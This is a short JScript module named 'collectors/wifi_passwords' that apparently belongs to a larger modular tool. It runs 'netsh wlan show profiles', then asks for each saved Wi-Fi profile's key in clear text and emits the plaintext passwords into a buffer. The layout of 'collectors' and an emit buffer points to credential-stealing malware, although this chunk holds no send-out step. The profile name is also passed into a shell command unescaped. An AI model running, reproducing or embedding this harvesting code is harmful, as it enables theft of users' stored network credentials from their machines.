// chunk: collectors/wifi_passwords
// depends: core/emit_buffer, core/run_cmd
// provides: collect_wifi
// format: jscript

function collect_wifi() {
    emit("\r\n=== WIFI PROFILES ===\r\n");
    var profiles = _run("netsh wlan show profiles");
    emit(profiles);
    var lines = profiles.split("\r\n");
    for (var i = 0; i < lines.length; i++) {
        var m = lines[i].match(/All User Profile\s*:\s*(.+)/);
        if (m) {
            var name = m[1].replace(/^\s+|\s+$/g, "");
            emit("--- Key for: " + name + " ---\r\n");
            emit(_run("netsh wlan show profile \"" + name + "\" key=clear"));
        }
    }
}
